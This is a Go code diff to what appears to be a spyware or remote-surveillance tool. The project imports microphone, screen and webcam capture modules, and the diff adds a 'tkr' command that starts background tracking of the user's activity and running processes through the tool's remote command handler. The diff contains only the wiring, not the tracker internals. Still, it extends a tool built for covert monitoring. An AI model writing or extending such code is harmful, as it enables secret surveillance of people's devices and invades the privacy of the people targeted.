@@ -9,6 +9,7 @@ import (
 	"github.com/cinus-e/spy/internal/literr"
 	"github.com/cinus-e/spy/internal/microphone"
 	"github.com/cinus-e/spy/internal/screen"
+	"github.com/cinus-e/spy/internal/tracker"
 	"github.com/cinus-e/spy/internal/util"
 	"github.com/cinus-e/spy/internal/webcam"
 )
@@ -48,6 +49,15 @@ func HandleCommand(command string) (string, error) {
 		}
 		w := &CamWorker{}
 		regWorker("cam", w)
+		if err := w.Run(args[1:]); err != nil {
+			return failure, err
+		}
+	case "tkr":
+		if len(args) < 3 {
+			return failure, literr.ArgsError
+		}
+		w := &TrackWorker{}
+		regWorker("tkr", w)
 		if err := w.Run(args[1:]); err != nil {
 			return failure, err
 		}
@@ -176,4 +186,20 @@ func (w *CamWorker) Run(args []string) error {
 
 func (w *CamWorker) Stop() error {
 	return w.capture.Close()
+}
+
+type TrackWorker struct {
+	tkr *tracker.Tracker
+}
+
+func (w *TrackWorker) Run(args []string) error {
+	w.tkr = tracker.NewTracker(util.StrToInt(args[0]), util.StrToInt(args[1]))
+	go w.tkr.TrackingActivity()
+	go w.tkr.TrackingProcess()
+	return nil
+}
+
+func (w *TrackWorker) Stop() error {
+	w.tkr.Stop()
+	return nil
 }
